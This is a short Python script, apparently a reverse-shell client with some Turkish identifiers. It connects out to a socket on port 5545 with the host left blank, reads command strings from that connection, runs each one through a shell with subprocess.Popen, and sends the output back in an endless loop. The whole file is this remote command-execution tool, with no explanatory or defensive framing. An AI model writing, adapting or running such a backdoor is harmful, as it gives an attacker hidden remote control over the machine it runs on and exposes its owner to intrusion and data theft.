from subprocess import *
import socket
from threading import Thread 


s = socket.socket()

s.connect(("",5545))

global res
res = [] 


def cevir(data55):
    proc = Popen(data55, shell =True, stdout = PIPE ,stderr = PIPE)
    data , data2 = proc.communicate()
    res.append(data)

while True:  
    f = s.recv(128).decode('utf-8') 
    veri = Thread(target = cevir, args=(f,)) 
    veri.start() 
    veri.join()
    veri_f = res[0] 
    s.send(veri_f) 
    res = [] 


s.close()
